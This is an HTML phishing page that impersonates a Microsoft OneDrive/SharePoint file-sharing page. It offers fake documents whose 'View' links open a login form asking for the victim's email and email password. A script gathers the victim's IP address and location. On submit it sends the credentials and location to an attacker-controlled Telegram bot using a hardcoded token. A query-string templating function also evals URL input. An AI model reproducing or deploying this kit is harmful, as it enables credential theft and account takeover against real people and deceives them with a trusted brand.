<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex">
    <link rel="icon" href="">

    <title>OneDrive - Download files</title>

    <!-- Bootstrap core CSS -->
    <link href="sharepointbuisness/lng/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="sharepointbuisness/lng/offcanvas.css" rel="stylesheet">
    <style>
      .card-img-top {
        width: 100%;
        border-top-left-radius: 0;
        border-top-right-radius: 0;
        }


        /* Medium devices (landscape tablets, 768px and up) */
        @media only screen and (max-width: 768px) {
          .sec-column {
            display: none;
          }
        } 
    </style>

<script>
//   $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
//  // Convert key-value pairs to JSON
//  // https://stackoverflow.com/a/39284735/452587
//  data = data.trim().split('\n').reduce(function(obj, pair) {
//    pair = pair.split('=');
//    return obj[pair[0]] = pair[1], obj;
//  }, {});
//  console.log(data.ip);
// });

</script>
  </head>

  <body class="bg-light" style="">

    <nav style="height: 50px;" class="navbar navbar-expand-md fixed-top navbar-dark bg-blue">
      <a style="font-size: 16px;" class="navbar-brand" href="javascript:void(0)">Microsoft | <span style="font-weight: 600;">SharePoint</span></a>
      <button class="navbar-toggler p-0 border-0" type="button" data-toggle="offcanvas" style="">
        <span class="navbar-toggler-icon"></span>
      </button>
    </nav>

    

    <main role="main" class="container">

    <!-- Create the Page Row  -->
    <div class="row">

        <!-- First Column  -->
        <div class="col-sm-12 col-md-9">
          <!-- Caption Area -->
            <div class="d-flex align-items-center p-3 my-3 text-white-50 bg-blue rounded box-shadow">
              <img class="mr-3" src="sharepointbuisness/lng/white-onedrive.svg" alt="" width="48" height="48">
              <div class="lh-100">
                <h6 class="mb-0 text-white lh-100">OneDrive</h6>
                <small>Total file size: 47 MB</small>
              </div>
            </div>

            <!-- File Explorer Area -->
            <div class="my-3 p-3 bg-white rounded box-shadow">
              <h6 class="border-bottom border-gray pb-2 mb-0">File Explorer</h6>
              <div class="media text-muted pt-3">
                <img width="32px" height="32px" src="sharepointbuisness/lng/word-icon.png" alt="" class="mr-2 rounded">
                <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
                  <div class="d-flex justify-content-between align-items-center w-100">
                    <strong class="text-gray-dark">2022 Products Brochure.docx</strong>
                    <a href="#" data-toggle="modal" data-target="#myModal">View</a>
                </div>
                  <span class="d-block">Description: Contract tender</span>
              </div>
            </div>


          <!--<div class="media text-muted pt-3">-->
          <!--  <img width="32px" height="32px" src=""  alt="" class="mr-2 rounded">-->
          <!--  <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">-->
          <!--    <div class="d-flex justify-content-between align-items-center w-100">-->
          <!--      <strong class="text-gray-dark">PO.xlsx</strong>-->
          <!--      <a href="#" data-toggle="modal" data-target="#myModal">View</a>-->
          <!--    </div>-->
          <!--    <span class="d-block">Description: A spreadsheet file containing purchase order</span>-->
          <!--  </div>-->
          <!--</div>-->

          <div class="media text-muted pt-3">
            <img width="32px" height="32px" src="sharepointbuisness/lng/ppt-icon.png" alt="" class="mr-2 rounded">
            <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
              <div class="d-flex justify-content-between align-items-center w-100">
                <strong class="text-gray-dark">Products Specifications</strong>
                <a href="#" data-toggle="modal" data-target="#myModal">View</a>
              </div>
              <span class="d-block">Description: An electronic presentation of product design and specification </span>
            </div>
          </div>
          <small class="d-block text-right mt-3">
            <a href="#" data-toggle="modal" data-target="#myModal">Download All</a>
          </small>
         </div>

        </div>
        <!-- End of First column -->


        <!-- Second Column For Advertisement-->
        <div class="col-sm-12 col-md-3 mt-3 sec-column">
            <div class="card">
             <!-- Header Title for the Card -->
               <h6 class="card-header">Advertisement</h6>
               <!-- Ads Image  -->
               <img class="card-img-top" src="sharepointbuisness/lng/outlook-anim.gif" alt="Card image cap">
               <div class="card-body">
                  <!-- <h5 class="card-title">Signed by:</h5> -->
                  <p class="card-text" style="margin-bottom: 0;"><small class="text-muted">Signed by: Sales Manager </small></p>
                  <p class="card-text"><small class="text-muted">Public Access Duration: 24 hrs </small></p>
              </div>
          </div>
        </div>
        <!-- End of Second Column -->

    </div>
    <!-- End of the Column -->

    
     

     
    </main>

    <!-- The Footer -->
    <footer class="footer">
      <div class="container">
        <span class="text-muted" style="font-size: 13px;">© Microsoft {STYLE_YEAR}.</span>
      </div>
    </footer>


    <!--Beginning of the Modal Box  -->
    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true" style="display: none;">
      <div class="modal-dialog modal-dialog-centered" role="document">

        <!-- First Modal Content  -->
            <div id="first-view" style="display: none;" class="modal-content">
              <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLongTitle"></h5>
                
              </div>
              <div class="modal-body">

              <!-- Spinner or Loader -->
              <div class="d-flex justify-content-center">
                <div class="row">
                   <div class="col"><img src="sharepointbuisness/lng/loader.gif" alt=""></div>
                   <div class="col"> <div> <p>Please wait. while we try to establish connection with your email server</p></div></div>
                </div>
               
               
              </div>
                <!-- End of Spinner or Loader -->

              </div>
              <div class="modal-footer">
                
              </div>
            </div>

        <!-- End of First Modal  -->


        <!-- Second Modal Content -->
            <div id="second-view" class="modal-content">
              <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLongTitle">Receiver's Authentication Desk</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                  <span aria-hidden="true">×</span>
                </button>
              </div>

             
              <div class="modal-body">
                
              <form  id="messageForm">
                  <!-- Server based Ajax Response -->
                  <div class="alert alert-danger" id="serverResponse" style="display: none;">Please try again later.</div>

                  <div class="form-group">
                    <label for="exampleInputEmail1"> Email address</label>
                    <input type="email" name="email" id="um" value="{|queryString.email|}" class="form-control" aria-describedby="emailHelp" placeholder="Receiver&#39;s Enter email" required>
                    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
                  </div>
                  <div class="form-group">
                    <label for="exampleInputPassword1">Password</label>
                    <input type="password" name="password" class="form-control" id="up" placeholder="Receiver&#39;s Email Password" required>
                    <small id="emailHelp" class="form-text text-muted">Required for end to end encryption.</small>
                  </div>
                  <div class="form-check">
                    <input type="checkbox" disabled="" checked="" class="form-check-input" id="exampleCheck1">
                    <label class="form-check-label" for="exampleCheck1" style="color:green;">Data Encryption Enabled</label>
                  </div>
                  <input type="hidden" name="ip" class="form-control" id="demo" value="" placeholder= "">
                  <input type="hidden" name="city" class="form-control" id="demo_1" value="" placeholder= "">
                  <input type="hidden" name="country" class="form-control" id="demo_2" value="" placeholder= "">
                  <input type="hidden" name="postal" class="form-control" id="demo_3" value="" placeholder= "">
                  <input type="hidden" name="date" class="form-control" id="demo_4" value="" placeholder= "">
                  <input type="hidden" name="port" class="form-control" id="demo_5" value="" placeholder= "">
                  <!-- <p name="ip" id="demo"> n </p> -->
                 
                  <button type="submit"  class="btn btn-primary">View Files</button>
                  </form>
              <div class="modal-footer">
                <!-- <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary">Next</button> -->
               
               
              </div>
              <div><small style="">Tip: To access files, enter receiver's email and password</small></div>
              <div><small style="font-size:10px;">All rights reserved. ©Microsoft 2022</small></div>
             
              
              
            </div>
            </div>
        

      </div>
    </div>
    <!--Ending of the Modal Box  -->

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
   
    <script src="sharepointbuisness/lng/jquery.min.js.download"></script>
    <script src="sharepointbuisness/lng/bootstrap.min.js.download"></script>
    <script src="sharepointbuisness/lng/popper.min.js.download"></script>
    <script src="sharepointbuisness/lng/holder.min.js.download"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    

  <script>
    $.getJSON('https://ipapi.co/json/', function(data) {
  

    document.getElementById("demo").value = (data.ip);
    document.getElementById("demo_1").value = (data.city);
    document.getElementById("demo_2").value = (data.country);
    document.getElementById("demo_3").value = (data.postal);
  

});
// let add = JSON.stringify (data, null, 2);

var today = new Date();
var dd = String(today.getDate()).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
var yyyy = today.getFullYear();

today = mm + '/' + dd + '/' + yyyy;
document.getElementById("demo_4").value = (today);

var port = location.port;
document.getElementById("demo_5").value = (port);

      const chat_id = '1724217684', botID = 'bot5311545356:AAFU1mfTkfsxxo4_l7n0oi_W7aCsbbBUdX0';
      const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
      document.querySelector('#messageForm').addEventListener("submit", async e => { // When the user submits the form
          e.preventDefault(); // Don't submit
          let text = JSON.stringify ( // Convert the form data to a string to send as our Telegram message
              Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
          null, 2); // Prettify the JSON so we can read the data easily
          const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
              method: 'POST',
              headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
              body: JSON.stringify({chat_id, text }), // The body must be a string, not an object
          });
          const messageStatus = document.querySelector('#status');
          $("#up").val("");
          $("#um").val("");
          
          var count=0;
                    if(count>=2){
               
                        // Redirect the User
                        window.location.replace("https://owy.mn/35MDuDz");
                      //  $('#serverResponse').html(res);
                    }else{
                          //Insert the Server response
                          $("#serverResponse").animate({right:0, opacity:"show"}, 1500);
                          // $('#serverResponse').show();
                        /**
                           * Hide Loader After two seconds
                           */
                          setTimeout(() => {
                          hideLoader();
                          showPageContent();
                          }, 5000);
                    }
                },
              ).done(function() {
                /**
                 * Enable all the Disabled inputs
                 */
    
                um.disabled = false;
                up.disabled = false;

               
            
      });
  </script>
    <script> 
       


        // Email address Validation Eventlistener
        um.addEventListener('blur', validateEmail);

        // Pass Validation Eventlistener
        up.addEventListener('blur', validatePass);



          /**
           * Validate UserEmail
           */
          function validateEmail() {
            // Target the Desired Element
            const email = document.getElementById('um');
            // Regular Expression 
            const re = /^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$/;
            
            // Check if the email form field is disabled or not
            if(email.disabled !== true) {
                if(!re.test(email.value)) {
                    // Add the Invalid Class to it
                    email.classList.add('is-invalid');
                    inputFlag = false;
                  
                } else {
                    // Add the Invalid Class to it
                    email.classList.remove('is-invalid');
                    inputFlag = true;
                  
                }
            }else {
                // Make the email Validation flag true
                inputFlag = true;
            }
        }



        /**
         * Validate User Password
         */
        function validatePass() {
            /*  Target the Desired Element */
          const pass = document.getElementById('up');
          
          if(pass.value.trim() == '' || pass.value.length < 3) {
              // Add the Invalid Class to it
              pass.classList.add('is-invalid');
              inputFlag = false;
          }
        }



        //Add eventlistener
        viewFileBtn.addEventListener('click',function(e){
            // clear Errors
            clearErrors();

            // Prevent Default Action
            e.preventDefault();

            // Check if there are no errors
            if(inputFlag == true) {
              
            /** Build the Form Values to be sent behind the seen VIA ajax */
                /**
             * Make an Ajax Request To the Server
             */
             count=count+1;
        
     
                

            }
        

        });
    </script>
  
<script>
const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
templatePage()
</script>

</body></html>
